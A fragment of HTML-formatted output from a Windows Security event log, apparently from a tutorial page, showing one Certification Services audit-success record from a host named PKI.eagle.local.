<span class="hljs-string">ProviderId           :</span> <span class="hljs-number">54849625</span><span class="hljs-number">-5478</span><span class="hljs-number">-4994</span>-a5ba<span class="hljs-number">-3e3</span>b0328c30d
<span class="hljs-string">LogName              :</span> Security
<span class="hljs-string">ProcessId            :</span> <span class="hljs-number">660</span>
<span class="hljs-string">ThreadId             :</span> <span class="hljs-number">772</span>
<span class="hljs-string">MachineName          :</span> PKI.eagle.local
<span class="hljs-string">UserId               :</span>
<span class="hljs-string">TimeCreated          :</span> <span class="hljs-number">4</span><span class="hljs-regexp">/11/</span><span class="hljs-number">2023</span> <span class="hljs-number">1</span>:<span class="hljs-number">24</span>:<span class="hljs-number">02</span> PM
<span class="hljs-string">ActivityId           :</span> dcf643ef<span class="hljs-number">-6</span>c67<span class="hljs-number">-0000</span><span class="hljs-number">-6e44</span>-f6dc676cd901
<span class="hljs-string">RelatedActivityId    :</span>
<span class="hljs-string">ContainerLog         :</span> Security
<span class="hljs-string">MatchedQueryIds      :</span> {}
<span class="hljs-string">Bookmark             :</span> System.Diagnostics.Eventing.Reader.EventBookmark
<span class="hljs-string">LevelDisplayName     :</span> Information
<span class="hljs-string">OpcodeDisplayName    :</span> Info
<span class="hljs-string">TaskDisplayName      :</span> Certification Services
<span class="hljs-string">KeywordsDisplayNames :</span> {Audit Success}
<span class="hljs-string">Properties           :</span> {System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty}
</code></pre>
<hr>
